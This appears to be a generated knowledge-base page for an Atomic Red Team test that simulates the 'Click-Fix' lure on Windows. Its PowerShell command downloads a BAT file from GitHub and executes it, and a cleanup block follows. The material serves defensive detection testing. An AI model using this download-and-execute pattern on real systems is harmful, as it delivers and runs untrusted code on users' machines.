---
atomic_guid: "22386853-f68d-4b50-a362-de235127c443"
title: "Simulate Click-Fix via Downloaded BAT File"
framework: "atomic"
generated: "true"
attack_technique_id: "T1204.002"
attack_technique_name: "User Execution: Malicious File"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "22386853-f68d-4b50-a362-de235127c443"
  - "Simulate Click-Fix via Downloaded BAT File"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Simulate Click-Fix via Downloaded BAT File

Simulates user execution of a BAT file downloaded from the Atomic Red Team GitHub repository.This test represents T1204.002 - User Execution via Malicious File.The BAT file performs harmless terminal output to simulate a "fix" operation.

## Metadata

- Atomic GUID: 22386853-f68d-4b50-a362-de235127c443
- Technique: T1204.002: User Execution: Malicious File
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1204.002/T1204.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1204-user_execution|T1204.002]]

## Input Arguments

### outfile

- description: Path where the BAT file will be saved
- type: path
- default: $env:TEMP\click-fix.bat

### url

- description: URL to download the BAT file from
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$url = "#{url}"
$outfile = "#{outfile}"
Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing
$process = Start-Process -FilePath $outfile -PassThru -WindowStyle Normal
$process.Id | Out-File "$env:TEMP\click-fix-pid.txt"
```

### Cleanup

```powershell
if (Test-Path "$env:TEMP\click-fix-pid.txt") {
  $pid = Get-Content "$env:TEMP\click-fix-pid.txt"
  Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
  Remove-Item "$env:TEMP\click-fix-pid.txt" -ErrorAction SilentlyContinue
}
Remove-Item "#{outfile}" -ErrorAction SilentlyContinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml)
